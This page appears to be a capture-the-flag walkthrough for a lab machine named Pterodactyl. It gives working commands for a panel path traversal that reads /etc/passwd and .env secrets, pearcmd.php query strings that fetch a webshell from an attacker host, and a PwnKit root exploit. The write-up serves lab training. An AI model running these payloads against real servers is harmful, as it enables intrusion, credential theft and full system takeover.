---
layout: default
title: "Pterodactyl"
parent: Insane Machines
grand_parent: Machines
permalink: /machines/insane/pterodactyl/
---

# Pterodactyl

![Machine Badge](https://img.shields.io/badge/Machine-Pterodactyl-blue)
![OS](https://img.shields.io/badge/OS-openSUSE-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red)

| Property | Value |
|----------|-------|
| **OS** | openSUSE Linux |
| **Difficulty** | Insane |
| **Release** | 2026-05-16 |
| **Tags** | #pterodactyl-panel #cve-2025-49132 #pear #pearcmd #lfi #pam #polkit #suse |

---

## Summary

Pterodactyl targets the **Pterodactyl game-server management panel** running on openSUSE. The chain is:

1. **Directory traversal in the Pterodactyl panel** (CVE-2025-49132) for arbitrary file read / panel takeover
2. **PEAR `pearcmd.php` LFI-to-RCE technique** - register-argc-argv allowed in php.ini -> `pearcmd.php` argument-injection produces a webshell
3. **PAM / Polkit privilege escalation** chain for root

openSUSE's path conventions and PAM stack differ from Debian/Ubuntu, complicating off-the-shelf techniques.

---

## External Writeups

- [0xdf - HTB Pterodactyl](https://0xdf.gitlab.io/2026/05/16/htb-pterodactyl.html)

---

## Key Techniques

- **CVE-2025-49132** - Pterodactyl panel path traversal in file management endpoint
- PEAR `pearcmd.php` LFI -> RCE (requires `register_argc_argv = On` and PEAR installed)
- `php.ini` `register_argc_argv` enables `argv` to be read from URL query string
- `pearcmd.php install --installroot=/path/to/webroot package.tgz` writes attacker-controlled `package.tgz` content into webroot
- **PAM stack abuse** on openSUSE (`/etc/pam.d/`)
- **Polkit/pkexec** known CVEs (`CVE-2021-4034` PwnKit, `CVE-2025-XXX` per Pterodactyl patch state)

---

## Attack Path

### 1. Recon

```bash
nmap -p- --min-rate=10000 -sV -sC pterodactyl.htb
# 22  ssh
# 443 https -> Pterodactyl Panel
```

Identify Pterodactyl version on `/api/application` or page metadata.

### 2. CVE-2025-49132 - Panel Path Traversal

```bash
curl -sk "https://pterodactyl.htb/api/client/servers/<server-id>/files/contents?file=../../../../../../etc/passwd" \
  -H "Authorization: Bearer <jwt>"
```

Use traversal to read panel `.env` and recover **APP_KEY**, **DB creds**, and **mail SMTP** credentials.

### 3. PEAR pearcmd.php LFI-to-RCE

`register_argc_argv = On` in php.ini means PHP populates `$argv` from the query string. When `pearcmd.php` is reachable via LFI, parameters become CLI args:

```bash
# Upload a malicious .tgz via attacker HTTP server containing a PHP webshell
python3 -m http.server 80

# Trigger LFI -> pearcmd.php with install command
curl -sk "https://pterodactyl.htb/?+config-create+/&file=/usr/share/pear/pearcmd.php&+install+-R+/var/www/html+http://10.10.14.5/pwn.tgz"

# Or argv-injection variant:
curl -sk "https://pterodactyl.htb/index.php?+install+-R+/var/www/html+http://10.10.14.5/pwn.tgz&file=/usr/share/pear/pearcmd.php"
```

Browse to written webshell -> RCE as `nginx`/`pterodactyl` user.

### 4. User Pivot

Recover Pterodactyl DB credentials, MySQL dump for password hashes of admin users. Cracked or reused passwords pivot to a real OS user via SSH.

### 5. Root via PAM / Polkit

Enumerate openSUSE specifics:

```bash
ls -la /etc/pam.d/
cat /etc/pam.d/common-auth-pc
# Look for misconfigured "auth sufficient pam_listfile.so" or world-writable conf
pkexec --version
# 0.120 -> PwnKit CVE-2021-4034 if unpatched
```

PwnKit:

```bash
git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034
make && ./cve-2021-4034
# euid=0
```

If PwnKit is patched, look for **polkit rules** (`/etc/polkit-1/rules.d/`) granting wheel-group `org.freedesktop.systemd1.manage-units` or similar, then start a malicious systemd user-service.

---

## Lessons Learned

- **`register_argc_argv = On` + reachable `pearcmd.php` = guaranteed RCE primitive.** This is a 2018-era trick still landing on 2026 Insane boxes.
- **Pterodactyl** is widely deployed for game-server hosting; its file-management endpoints are a high-value target.
- **openSUSE** breaks assumptions: Polkit, PAM, default paths all differ from Debian/Ubuntu. Always read `/etc/os-release` first.
- **PwnKit** (CVE-2021-4034) remains one of the most reliable Linux LPEs in 2026 due to slow patching cadence on niche distros.

---

## References

- PEAR `pearcmd.php` LFI-to-RCE technique: https://www.synacktiv.com/publications/exploiting-php-phar-deserialization-vulnerabilities-part-1.html (related)
- Pterodactyl Panel: https://pterodactyl.io/
- PwnKit CVE-2021-4034: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
